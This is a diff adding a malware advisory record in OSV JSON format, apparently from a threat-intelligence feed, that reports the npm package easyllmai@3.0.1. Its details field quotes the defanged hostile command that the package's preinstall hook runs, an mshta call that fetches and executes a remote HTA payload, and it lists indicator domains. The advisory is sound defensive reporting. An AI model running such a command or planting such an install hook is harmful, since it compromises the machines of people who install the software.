@@ -1,0 +1,65 @@
+{
+  "schema_version": "1.6.0",
+  "id": "LWA-2026-5563",
+  "aliases": [
+    "MAL-2026-5895"
+  ],
+  "modified": "2026-06-16T12:01:21Z",
+  "published": "2026-06-16T12:00:53Z",
+  "summary": "Malicious code in easyllmai (npm)",
+  "details": "Easyllmai@3.0.1 uses its preinstall lifecycle hook to download and execute arbitrary remote code. On install, preinstall.js runs 'cmd /c \"mshta hxxp://fixars[.]top\"' which fetches and executes an HTA payload from fixars[.]top using the Windows Mshta LOLBin. The package's main entry (index.js) is a harmless decoy greeting function; the malicious behaviour occurs during installation, before any require().",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "npm",
+        "name": "easyllmai",
+        "purl": "pkg:npm/easyllmai@3.0.1"
+      },
+      "versions": [
+        "3.0.1"
+      ],
+      "database_specific": {
+        "cwes": [
+          {
+            "cweId": "CWE-506",
+            "name": "Embedded Malicious Code"
+          }
+        ],
+        "leitwacht": {}
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "PACKAGE",
+      "url": "https://www.npmjs.com/package/easyllmai/v/3.0.1"
+    },
+    {
+      "type": "REPORT",
+      "url": "https://threatintel.leitwacht.eu/d/LWA-2026-5563"
+    }
+  ],
+  "credits": [
+    {
+      "name": "Leitwacht",
+      "type": "FINDER",
+      "contact": [
+        "https://threatintel.leitwacht.eu"
+      ]
+    }
+  ],
+  "database_specific": {
+    "leitwacht": {
+      "category": "malware",
+      "first_seen_at": "2026-06-16T12:00:53Z",
+      "indicators_observed": {
+        "domain_observed": [
+          "fixars[.]top"
+        ],
+        "url_observed": [
+          "hxxp://fixars[.]top"
+        ]
+      }
+    }
+  }
+}
